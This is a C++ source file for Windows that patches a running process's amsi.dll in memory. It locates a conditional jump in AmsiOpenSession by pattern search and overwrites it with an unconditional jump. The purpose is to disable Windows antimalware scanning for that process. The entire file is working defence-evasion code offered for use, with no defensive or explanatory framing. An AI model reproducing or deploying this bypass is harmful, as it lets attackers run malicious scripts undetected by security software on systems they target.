#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <iostream>
#include <string>

//00007FFAE957C650 | 48:85D2 | test rdx, rdx |
//00007FFAE957C653 | 74 3F | je amsi.7FFAE957C694 |
//00007FFAE957C655 | 48 : 85C9 | test rcx, rcx |
//00007FFAE957C658 | 74 3A | je amsi.7FFAE957C694 |
//00007FFAE957C65A | 48 : 8379 08 00 | cmp qword ptr ds : [rcx + 8] , 0 |
//00007FFAE957C65F | 74 33 | je amsi.7FFAE957C694 |

char patch[] = { 0xEB };

DWORD
GetPID(
	LPCWSTR pn)
{
	DWORD procId = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 pE;
		pE.dwSize = sizeof(pE);

		if (Process32First(hSnap, &pE))
		{
			if (!pE.th32ProcessID)
				Process32Next(hSnap, &pE);
			do
			{
				size_t size = strlen(pE.szExeFile) + 1;
				wchar_t* targetProcessName = new wchar_t[size];
				size_t outSize;
				mbstowcs_s(&outSize, targetProcessName, size, pE.szExeFile, size - 1);
				if (!lstrcmpiW(targetProcessName, pn))
				{
					procId = pE.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnap, &pE));
		}
	}
	CloseHandle(hSnap);
	return (procId);
}

unsigned long long int
searchPattern(
	BYTE* startAddress, 
	DWORD searchSize, 
	BYTE* pattern, 
	DWORD patternSize)
{
	DWORD i = 0;

	while (i < 1024) {

		if (startAddress[i] == pattern[0]) {
			DWORD j =1;
			while (j < patternSize && i + j < searchSize && (pattern[j] == '?' || startAddress[i + j] == pattern[j])) {
				j++;
			}
			if (j == patternSize) {
				printf("offset : %d\n", i + 3);
				return (i + 3);
			}
		}
		i++;
	}
}


int
wmain() {
	
	int nArgs;
	LPWSTR* szArglist;
	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);

	BYTE pattern[] = { 0x48,'?','?', 0x74,'?',0x48,'?' ,'?' ,0x74,'?' ,0x48,'?' ,'?' ,'?' ,'?',0x74,0x33};

	DWORD patternSize = sizeof(pattern);

	DWORD tpid = 0;
	if (nArgs > 1) {
		if (!wcscmp(L"-i", szArglist[1])) {
			tpid = std::stoi(szArglist[2]);
		}
		if (!wcscmp(L"-p", szArglist[1])) {
			tpid = GetPID((LPCWSTR)szArglist[2]);
		}
	}
	else {
		tpid = GetCurrentProcessId();
	}

	if (!tpid) {
		printf("Couldn't get target pid. Exiting\n");
		return -1;
	}

	printf("Target PID: %d\n", tpid);

	HANDLE ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, tpid);

	if (!ProcessHandle) {
		printf("Could not get a handle on process: %d. Exiting.\n", tpid);
		return (-1);
	}

	HMODULE hm = LoadLibraryA("amsi.dll");
	if (!hm) {
		printf("Could not load amsi.dll. Exiting\n");
		return(-1);
	}

	PVOID AmsiAddr = GetProcAddress(hm, "AmsiOpenSession");

	if (!AmsiAddr) {
		printf("Could not get address for AMSI. Exiting.\n");
		return(-1);
	}

	printf("AMSI address %X\n",AmsiAddr);

	unsigned char buff[1024];

	ReadProcessMemory(ProcessHandle, AmsiAddr, &buff, 1024, (SIZE_T*)NULL);

	int matchAddress = searchPattern(buff, sizeof(buff), pattern, patternSize);

	unsigned long long int updateAmsiAdress = (unsigned long long int)AmsiAddr;

	updateAmsiAdress += matchAddress;

	if (!WriteProcessMemory(ProcessHandle, (PVOID)updateAmsiAdress, patch, 1, 0)) {
		printf("Could not write to process memory. Exiting.\n");
		return(-1);
	}

	printf("AMSI patched\n");

	return 0;
}